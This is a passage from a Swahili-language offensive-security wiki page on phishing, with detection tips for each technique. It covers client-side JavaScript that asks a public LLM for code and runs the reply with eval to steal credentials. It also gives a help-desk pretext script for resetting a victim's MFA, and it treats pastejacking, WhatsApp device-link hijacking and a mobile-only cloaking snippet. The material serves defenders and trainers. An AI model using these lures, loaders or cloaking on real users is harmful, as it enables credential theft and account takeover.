2. **Client-side API call:** wakati wa load, JS huita public LLM (Gemini/DeepSeek/etc.) au CDN proxy; prompt/API call pekee ndiyo huwa kwenye static HTML.
3. **Assemble & exec:** unganisha jibu na kulitekeleza (polymorphic kwa kila visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** code generated hubinafsisha lure (kwa mfano, LogoKit token parsing) na kutuma creds kwenye endpoint iliyofichwa ndani ya prompt.

**Sifa za Evasion**
- Traffic hupitia LLM domains zinazojulikana au CDN proxies zinazoaminika; wakati mwingine kupitia WebSockets kuelekea backend.
- Hakuna static payload; malicious JS huwepo tu baada ya render.
- Generations zisizo deterministic huzalisha stealers **za kipekee** kwa kila session.

**Mawazo ya Detection**
- Endesha sandboxes zikiwa na JS imewashwa; weka alama kwenye **runtime `eval`/dynamic script creation inayotokana na majibu ya LLM**.
- Tafuta front-end POSTs zinazoenda kwenye LLM APIs na kufuatiwa mara moja na `eval`/`Function` kwenye maandishi yaliyorejeshwa.
- Toa alert kwa LLM domains zisizoidhinishwa kwenye client traffic pamoja na credential POSTs zinazofuata.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Mbali na push-bombing ya kawaida, operators hufanya tu **usajili mpya wa MFA** wakati wa simu ya help-desk, na hivyo kubatilisha token iliyokuwepo ya user.  Login prompt yoyote inayofuata huonekana kuwa halali kwa victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Fuatilia matukio ya AzureAD/AWS/Okta ambapo **`deleteMFA` + `addMFA`** hutokea **ndani ya dakika chache kutoka kwa IP ileile**.



## Clipboard Hijacking / Pastejacking

Washambuliaji wanaweza kunakili kimya kimya commands hasidi kwenye clipboard ya mwathiriwa kutoka kwenye ukurasa wa wavuti uliodukuliwa au wenye jina linalofanana kwa udanganyifu, kisha kumshawishi mtumiaji kuzibandika ndani ya **Win + R**, **Win + X** au dirisha la terminal, na hivyo kutekeleza code yoyote bila download au attachment yoyote.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Ukurasa wa mtego (kwa mfano, “channel” bandia ya ministry/CERT) huonyesha QR ya WhatsApp Web/Desktop na kumwelekeza mwathiriwa kuiscan, na hivyo kumwongeza mshambuliaji kimya kimya kama **linked device**.<sup>[[10]](#references)</sup>
* Mshambuliaji hupata mara moja mwonekano wa chats/contacts hadi session iondolewe. Baadaye waathiriwa wanaweza kuona notification ya “new device linked”; defenders wanaweza kutafuta matukio yasiyotarajiwa ya ku-link kifaa muda mfupi baada ya kutembelea kurasa za QR zisizoaminika.

### Mobile‑gated phishing to evade crawlers/sandboxes
Waendeshaji wanaendelea kuweka phishing flows zao nyuma ya device check rahisi ili desktop crawlers zisifike kwenye kurasa za mwisho. Mfano wa kawaida ni script ndogo inayokagua kama DOM inaweza kutumia touch na kutuma matokeo kwenye server endpoint; clients zisizo za mobile hupokea HTTP 500 (au ukurasa mtupu), huku watumiaji wa mobile wakipewa flow kamili.<sup>[[6]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` mantiki (iliyorahisishwa):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Tabia ya server inayozingatiwa mara nyingi:
- Hu-set session cookie wakati wa load ya kwanza.
- Hukubali `POST /detect {"is_mobile":true|false}`.
- Hurejesha 500 (au placeholder) kwa GET zinazofuata wakati `is_mobile=false`; huhudumia phishing ikiwa tu `true`.

Heuristics za hunting na detection:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: mfuatano wa `GET /static/detect_device.js` → `POST /detect` → HTTP 500 kwa non-mobile; njia halali za victim wa mobile hurejesha 200 pamoja na HTML/JS inayofuata.
- Zuia au chunguza kwa makini pages zinazoweka masharti ya content pekee kupitia `ontouchstart` au device checks zinazofanana.

Vidokezo vya ulinzi:
- Endesha crawlers zikiwa na mobile-like fingerprints na JS ikiwa enabled ili kufichua content iliyofichwa.
- Weka alert kwa responses za 500 zinazotiliwa shaka zinazofuata `POST /detect` kwenye domains zilizosajiliwa hivi karibuni.

## References

- [1] [Kutengeneza Domain Variations Zinazotumiwa katika Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Kutafuta Phishing: Tools na Techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kuiba sessions na kubypass 2FA kwa EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [4] [Jinsi ya Kusakinisha na Kusanidi DKIM pamoja na Postfix kwenye Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [5] [Ripoti ya 2025 Unit 42 Global Incident Response – Toleo la Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [6] [Silent Smishing – mobile-gated phishing infra na heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [7] [Mpaka Mpya wa Runtime Assembly Attacks: Kutumia LLMs Kuzalisha Phishing JavaScript kwa Wakati Halisi](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [8] [Impersonation, Click Hijacking, na TDS: Ndani ya Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [9] [Kuhijack traffic inayoelekea windows.com ya Microsoft kwa bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [10] [Love? Actually: Fake dating app iliyotumiwa kama lure katika targeted spyware campaign nchini Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [11] [ESET GhostChat IoCs na samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
